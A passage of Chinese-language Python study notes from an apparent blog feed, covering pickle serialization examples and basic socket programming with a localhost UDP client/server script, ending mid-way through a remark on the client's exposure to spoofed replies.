class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span>:</span></span><br><span class="line">    title       = <span class="string">""</span></span><br><span class="line">    isbn        = <span class="string">""</span></span><br><span class="line">    parts       = <span class="literal">None</span></span><br><span class="line">    chapters    = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, title, isbn, parts, chapters)</span>:</span></span><br><span class="line">        self.title      = title</span><br><span class="line">        self.isbn       = isbn</span><br><span class="line">        self.parts      = parts</span><br><span class="line">        self.chapters   = chapters</span><br><span class="line">       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Title of the book: %s"</span>%(self.title))</span><br><span class="line">        print(<span class="string">"ISBN of the book: %s"</span>%(self.isbn))</span><br><span class="line">        print(<span class="string">"Parts are:"</span>)</span><br><span class="line">        <span class="keyword">for</span> part <span class="keyword">in</span> self.parts:</span><br><span class="line">            print(part)</span><br><span class="line">        print(<span class="string">"Chapters are:%s"</span>%(self.chapters))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    partName     = <span class="string">""</span></span><br><span class="line">    beginChapter = <span class="number">-1</span></span><br><span class="line">    endChapter   = <span class="number">-1</span></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, partName, beginChapter, endChapter)</span>:</span></span><br><span class="line">        self.partName     = partName</span><br><span class="line">        self.beginChapter = beginChapter</span><br><span class="line">        self.endChapter   = endChapter</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        stringRep =  <span class="string">"%s"</span>%(self.partName)       </span><br><span class="line">        <span class="keyword">return</span> stringRep</span><br><span class="line"></span><br><span class="line">part1 = Part(<span class="string">"Part 1"</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line">part2 = Part(<span class="string">"Part 2"</span>, <span class="number">4</span>, <span class="number">5</span>)       </span><br><span class="line">part3 = Part(<span class="string">"Part 3"</span>, <span class="number">6</span>, <span class="number">7</span>)</span><br><span class="line"> </span><br><span class="line">bookTitle       = <span class="string">"Book yet to be written"</span>;</span><br><span class="line">bookISBN        = <span class="string">"XXX-X-XX-XXXXXX-X"</span>;</span><br><span class="line">bookParts       = [part1, part2, part3]</span><br><span class="line">bookChapters    = [<span class="string">"Chapter 1"</span>, <span class="string">"Chapter 2"</span>, <span class="string">"Chapter 3"</span>,</span><br><span class="line">                   <span class="string">"Chapter 4"</span>, <span class="string">"Chapter 5"</span>, <span class="string">"Chapter 6"</span>,</span><br><span class="line">                   <span class="string">"Chapter 7"</span>];</span><br><span class="line"></span><br><span class="line">book = Book(bookTitle, bookISBN, bookParts, bookChapters)</span><br><span class="line"><span class="comment"># 创建buffer存储pickle对象</span></span><br><span class="line">pickleBuffer = io.BytesIO()</span><br><span class="line">print(<span class="string">"Pickling of the object into the memory buffer started"</span>)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">pickle.dump(book,pickleBuffer)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Pickling of the object into the memory buffer ended"</span>)</span><br><span class="line">print(<span class="string">"Pickled buffer beginning address:"</span>)</span><br><span class="line">print(pickleBuffer.getbuffer())</span><br><span class="line">print(<span class="string">"Unpickling of the object from memory started"</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">unpickledBook = pickle.loads(pickleBuffer.getbuffer())</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Unpickling of the object from memory ended"</span>)</span><br><span class="line">print(<span class="string">"Printing the attributes of unpickled object"</span>)</span><br><span class="line">unpickledBook.identify()</span><br></pre></td></tr></table></figure></li></ul></li><li><p>pickle.dumps()参数</p><p>pickle.dumps(obj, protocol=None,*,fix_imports=True)</p><ul><li>与pickle.dump()区别，pickle.dumps()方法不需要写入文件中，他是直接返回一个序列化的bytes对象</li></ul></li></ul></li><li><p>==反序列化==语法</p><ul><li><p>pickle.load(file)</p><ul><li>反序列化对象（将文件中数据解析为一个Python对象）</li><li>==注意==：load(file)时，要让Python能够找到类的定义,否则会报错</li><li>注意：参数file，必须是以二进制的形式进行操作（读取）</li><li>示例：819test_pickle.py</li></ul></li><li><p>反序列方法pickle.loads()</p><ul><li><p>参数如下：</p><p>pickle.loads(bytes_object, *,fix_imports=True, encoding=”ASCII”. errors=”strict”)</p></li><li><p><code>pickle.loads()</code>方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pickle</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.dumps([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"><span class="string">b'\x80\x03]q\x00(K\x01K\x02K\x03e.'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(_)</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#load(file)时，要让Python能够找到类的定义,否则会报错</span></span><br><span class="line"><span class="keyword">import</span> pickle  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,n,a)</span>:</span>  </span><br><span class="line">        self.name=n  </span><br><span class="line">      self.age=a  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(self)</span>:</span>  </span><br><span class="line">      print(self.name+<span class="string">" "</span>+str(self.age))  </span><br><span class="line">aa = Person(<span class="string">"JGood"</span>, <span class="number">2</span>)  </span><br><span class="line">aa.show()  </span><br><span class="line"><span class="comment"># del Person</span></span><br><span class="line">f=open(<span class="string">'p.txt'</span>,<span class="string">'wb'</span>)  </span><br><span class="line">pickle.dump(aa,f,<span class="number">0</span>)  </span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  注释掉删除类对象操作，若未注释则会报错</span><br><span class="line">del Person  </span><br><span class="line">  f&#x3D;open(&#39;p.txt&#39;,&#39;rb&#39;)  </span><br><span class="line">  bb&#x3D;pickle.load(f)  </span><br><span class="line">  f.close()  </span><br><span class="line">  bb.show()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ python 819test_pickle.py </span><br><span class="line">  JGood 2</span><br><span class="line">JGood 2</span><br></pre></td></tr></table></figure><p>未注释结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  (venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ python 819test_pickle.py </span><br><span class="line">  JGood 2</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File &quot;819test_pickle.py&quot;, line 15, in &lt;module&gt;</span><br><span class="line">      bb&#x3D;pickle.load(f)  </span><br><span class="line">  AttributeError: Can&#39;t get attribute &#39;Person&#39; on &lt;module &#39;__main__&#39; from &#39;819test_pickle.py&#39;&gt;</span><br><span class="line">  </span><br><span class="line">  [p.txt](p.txt)文件中数据存储格式：</span><br><span class="line">  </span><br><span class="line">  &#96;&#96;&#96;python</span><br><span class="line">  &gt;&gt;&gt; with open(&#39;p.txt&#39;,&#39;rb&#39;) as f:</span><br><span class="line">  ...     f.read()</span><br><span class="line">  ... </span><br><span class="line">  b&#39;ccopy_reg\n_reconstructor\np0\n(c__main__\nPerson\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVJGood\np7\nsVage\np8\nL2L\nsb.&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> python网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python网络编程01</title>
      <link href="/2020/03/14/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/"/>
      <url>/2020/03/14/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="学习内容"><a href="#学习内容" class="headerlink" title="学习内容"></a>学习内容</h2><ul><li>了解socket基本概念</li><li>利用socket类方法获取主机、网络及目标服务的信息</li><li>UDP、TCP客户端/服务器编写</li><li>案例：python SOCKET实现RSA加密的全双工聊天程序</li></ul><a id="more"></a><h2 id="学习步骤"><a href="#学习步骤" class="headerlink" title="学习步骤"></a>学习步骤</h2><h4 id="构建python环境"><a href="#构建python环境" class="headerlink" title="构建python环境"></a>构建python环境</h4><p>同时开发多个python应用程序（共用一个Python，不同版本的包不兼容会产生无用包），利用virtualenv创建“Python虚拟环境”（小型、独立的、隔离功能的Python环境），从而避免产生无用包</p><ul><li>利用virtualenvwrapper管理virtualenv虚拟环境<ul><li>mkvirtualenv venv ：创建虚拟环境venv</li><li>workon                       ：查看当前已有虚拟环境目录</li><li>workon venv            ：进入venv虚拟环境</li><li>deactivate                 ：退出虚拟环境</li><li>rmvirtualenv venv：删除虚拟环境venv</li></ul></li></ul><h4 id="socket概念"><a href="#socket概念" class="headerlink" title="socket概念"></a>socket概念</h4><ul><li>运行在不同机器上的进程通过套接字发送报文来进行通信，套接字充当了两个进程通信的“中间人”，观察下图（OSI模型中）：</li><li><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/socket.png" alt="socket"></li><li>套接字是个通信端点，操作系统使用整数来标识套接字，Python使用socket.socket对象表示套接字（该对象内部表示的是操作系统标识套接字的整数，可利用fileno()方法查看），调用socket.socket对象的方法请求使用套接字的系统调用是，该对象会自动使用内部维护的套接字整数标识符</li><li>socket.socket对象的fileno()方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> socket</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = socket.socket()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.fileno()</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><ul><li>IP地址、端口号<ul><li>端口号（port）传输层协议内容、用来标识一个进程</li><li>一个端口号只能被一个进程占用</li><li>IP地址 + 端口号能标识网络上的某一台主机的某一个进程</li></ul></li><li>套接字组成：IP地址和端口号就构成了一个网络中的唯一标识符，即套接字</li><li>套接字类型（常用的两种）<ul><li>流套接字：创建socket对象时（用socket.SOCK_STREAM）<ul><li>面向连接、可靠的数据传输服务。能够保证数据无差错、无重复、按顺序发送</li></ul></li><li>数据包套接字：创建socket对象时，使用socket.SOCK_DGRAM<ul><li>提供无连接服务。无需建立连接，只需将目的地址信息打包后发送；该服务使用UDP进行传输，延迟小且效率高，缺点不能保证数据传输的可靠性</li></ul></li></ul></li></ul><h4 id="利用socket类方法获取主机、网络及目标服务的信息"><a href="#利用socket类方法获取主机、网络及目标服务的信息" class="headerlink" title="利用socket类方法获取主机、网络及目标服务的信息"></a>利用socket类方法获取主机、网络及目标服务的信息</h4><ul><li><p>获取主机名、地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> socket</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.gethostname()</span><br><span class="line"><span class="string">'fishmouse'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.gethostbyname(_)</span><br><span class="line"><span class="string">'127.0.1.1'</span></span><br></pre></td></tr></table></figure></li><li><p>获取远程设备IP地址（如获取：<a href="http://www.baidu.com）" target="_blank" rel="noopener">www.baidu.com）</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.gethostbyname(<span class="string">'www.baidu.com'</span>)</span><br><span class="line"><span class="string">'14.215.177.38'</span></span><br></pre></td></tr></table></figure><p>可看到socket.gethostbyname具有==域名解析的作用==，ping一下看通不通</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ ping 14.215.177.38</span><br><span class="line">PING 14.215.177.38 (14.215.177.38) 56(84) bytes of data.</span><br><span class="line">64 bytes from 14.215.177.38: icmp_seq&#x3D;1 ttl&#x3D;55 time&#x3D;37.9 ms</span><br><span class="line">64 bytes from 14.215.177.38: icmp_seq&#x3D;2 ttl&#x3D;55 time&#x3D;39.4 ms</span><br><span class="line">64 bytes from 14.215.177.38: icmp_seq&#x3D;3 ttl&#x3D;55 time&#x3D;34.8 ms</span><br></pre></td></tr></table></figure></li><li><p>IP地址格式转换（打包成32位二进制格式）：socket类方法inet_aton、inet_ntoa</p><ul><li><p>inet_aton()使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip_addr =<span class="string">'127.0.0.1'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.inet_aton(ip_addr)</span><br><span class="line"><span class="string">b'\x7f\x00\x00\x01'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> binascii</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>binascii.hexlify(_)</span><br><span class="line"><span class="string">b'7f000001'</span></span><br></pre></td></tr></table></figure></li></ul><p>观察看到，转换后的32位二进制格式，并调用binasci.hexlify以16进制形式表示二进制数据</p><p>10进制结果，单个字节转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> struct</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>struct.unpack(<span class="string">'B'</span>,<span class="string">b'\x7f'</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="number">127</span></span><br></pre></td></tr></table></figure><ul><li><p>inet_ntoa()使用：32位二进制包转换为IPv4地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a的主机字节序----------网络字节序 ---------b的主机字节序&gt;&gt;&gt; ip_addr =<span class="string">'127.0.0.1'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.inet_aton(ip_addr)</span><br><span class="line"><span class="string">b'\x7f\x00\x00\x01'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.inet_ntoa(_)</span><br><span class="line"><span class="string">'127.0.0.1'</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>通过指定的端口和协议找到服务名</p><ul><li><p>socket.getservbyport()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">80</span>)</span><br><span class="line"><span class="string">'http'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">53</span>)</span><br><span class="line"><span class="string">'domain'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">25</span>)</span><br><span class="line"><span class="string">'smtp'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">21</span>)</span><br><span class="line"><span class="string">'ftp'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">3306</span>)</span><br><span class="line"><span class="string">'mysql'</span></span><br></pre></td></tr></table></figure></li><li><p>socket.getservbyname() ：通过服务名获取端口</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyname(<span class="string">'ssh'</span>)</span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyname(<span class="string">'http'</span>)</span><br><span class="line"><span class="number">80</span></span><br></pre></td></tr></table></figure><p>linux系统中，etc/services文件中可查看相关服务和端口</p></li><li><p>主机字节序和网络字节序之间的转换</p><p>不同主机a，b之间通信，数据格式需转换</p><p>a的固有数据存储——-标准化——–转化成b的固有格式</p><p>也即为：</p><p>==a的主机字节序———-网络字节序 ———b的主机字节序==</p><ul><li><p>主机字节序</p><p>主机内部，内存中数据的处理方式，可以分为两种：</p><ul><li><p>大端字节序：按照内存的增长方向，高位数据存储在高位内存中</p></li><li><p>小端字节序：按照内存的增长方向，高位数据存储在低位内存中</p><p><img src="python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B0%8F%E7%AB%AF.png" alt=""></p></li></ul></li><li><p>socket.ntohl()、socket.htonl()、ntohs()、htons()</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>data = <span class="number">1234</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.htonl(data)</span><br><span class="line"><span class="number">3523477504</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.htons(data)</span><br><span class="line"><span class="number">53764</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.ntohl(data)</span><br><span class="line"><span class="number">3523477504</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.ntohs(data)</span><br><span class="line"><span class="number">53764</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.ntohs(<span class="number">53764</span>)</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure><ul><li><p>设定并获取默认的套接字超时时间</p><ul><li><p>socket.gettimeout()、socket.settimeout()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = socket.socket()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.gettimeout()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.settimeout(<span class="number">100</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.gettimeout()</span><br><span class="line"><span class="number">100.0</span></span><br></pre></td></tr></table></figure><p>默认套接字超时时间为0</p></li></ul></li><li><p>套接字错误异常处理</p><ul><li>try…except  套接字异常类型 as 参数…</li></ul></li><li><p>argparse：命令项选项与参数解析的模块</p><ul><li>parser=argparse.ArgumentParser()：创建解析对象</li><li>parser.add_argument()：向对象中添加关注的命令行参数和选项</li><li>given_args = parser.parse_args()：对象解析</li></ul></li><li><p>套接字发送和接收的缓冲区大小修改</p><ul><li>socket中getsockopt()、setsockopt()方法</li></ul></li><li><p>套接字阻塞模式和非阻塞模式</p><ul><li>s= socket.socket()</li><li>s.setblocking(1)：设为阻塞模式</li><li>s.setblocking(0)：设为非阻塞模式</li></ul><p>默认情况下，TCP套接字处于阻塞模式</p></li></ul><h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><ul><li><p>多路复用：允许多个会话共享同一介质或机制的一种解决方案</p></li><li><p>UDP支持多路复用：UDP协议提供端口号，用于对目标为同一机器上不同服务的多个数据包进行适当的多路分解</p></li><li><p>TCP：多路复用、可靠传输</p></li><li><p>UDP机制：仅使用IP地址和端口进行标识，以此将数据包发送至目标地址</p></li><li><p>使用自环接口的UDP服务器和 客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># UDP client and server on localhost</span></span><br><span class="line"><span class="comment"># 814udp_local.py </span></span><br><span class="line"><span class="keyword">import</span> argparse, socket</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">MAX_BYTES = <span class="number">65535</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># server</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span><span class="params">(port)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">    sock.bind((<span class="string">'127.0.0.1'</span>,port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># getsockname()返回sock示例对象的（地址，端口)</span></span><br><span class="line">    print(<span class="string">"Listening at &#123;&#125;"</span>.format(sock.getsockname()))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data, address = sock.recvfrom(MAX_BYTES)</span><br><span class="line">        text = data.decode(<span class="string">'ascii'</span>)</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">"The client at &#123;&#125; says &#123;!r&#125;"</span>.format(address,text))</span><br><span class="line"></span><br><span class="line">        text = <span class="string">'Your data was &#123;&#125; bytes long '</span>.format(len(data))</span><br><span class="line">        data = text.encode(<span class="string">'ascii'</span>)</span><br><span class="line">        sock.sendto(data,address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span><span class="params">(port)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    text = <span class="string">'The time is &#123;&#125;'</span>.format(datetime.now())</span><br><span class="line">    data = text.encode(<span class="string">'ascii'</span>)</span><br><span class="line">   </span><br><span class="line">    sock.sendto(data,(<span class="string">'127.0.0.1'</span>,port))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># sock.getsockname()获取当前进程的（地址，端口）元组信息</span></span><br><span class="line">    print(<span class="string">'The OS assigned me the address &#123;&#125;'</span>.format(sock.getsockname()))</span><br><span class="line">    data, address = sock.recvfrom(MAX_BYTES)</span><br><span class="line"></span><br><span class="line">    text = data.decode()</span><br><span class="line">    <span class="comment"># format格式化字符串</span></span><br><span class="line">    print(<span class="string">'The server &#123;&#125; replied &#123;!r&#125;'</span>.format(address,text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 字典</span></span><br><span class="line">    choices = &#123;<span class="string">'client'</span>:client,<span class="string">'server'</span>:server&#125;</span><br><span class="line">    <span class="comment"># 创建参数解析对象</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Send and receive UDP locally'</span>)</span><br><span class="line">    <span class="comment">#添加要解析的参数</span></span><br><span class="line">    parser.add_argument(<span class="string">'role'</span>,choices=choices,help =<span class="string">'which role to play'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>,metavar=<span class="string">'PORT'</span>,type=int,default=<span class="number">1060</span>,help=<span class="string">'UDP port (default 1060)'</span>)</span><br><span class="line">    <span class="comment"># 参数解析</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 调用服务端或客户端函数</span></span><br><span class="line">    function = choices[args.role]</span><br><span class="line">    function(args.p)</span><br></pre></td></tr></table></figure><ul><li><p>先运行服务端</p><ul><li><p>python 814udp_local.py server</p><p>结果：</p><p>Listening at (‘127.0.0.1’, 1060)<br>The client at (‘127.0.0.1’, 60945) says ‘The time is 2019-08-16 16:34:56.276877’</p></li></ul></li><li><p>再运行客户端</p><ul><li><p>python 814udp_local.py client</p><p>The OS assigned me the address (‘0.0.0.0’, 60945)<br>The server (‘127.0.0.1’, 1060) replied ‘Your data was 38 bytes long ‘</p></li></ul></li><li><p>混杂客户端与垃圾回复</p><p>814udp_local.py代码中，客户端程序存在安全隐患，如fg果服务端响应延迟一会，攻击者伪装成服务器的一个响应，客户端并没有检查是否是真正服务器的响应</p><ul><li><p>先运行服务器，再将服务器暂停，创建一个快速发送信息的响应给客户端，再==fg命令==将暂停的服务器开启</p><p><img 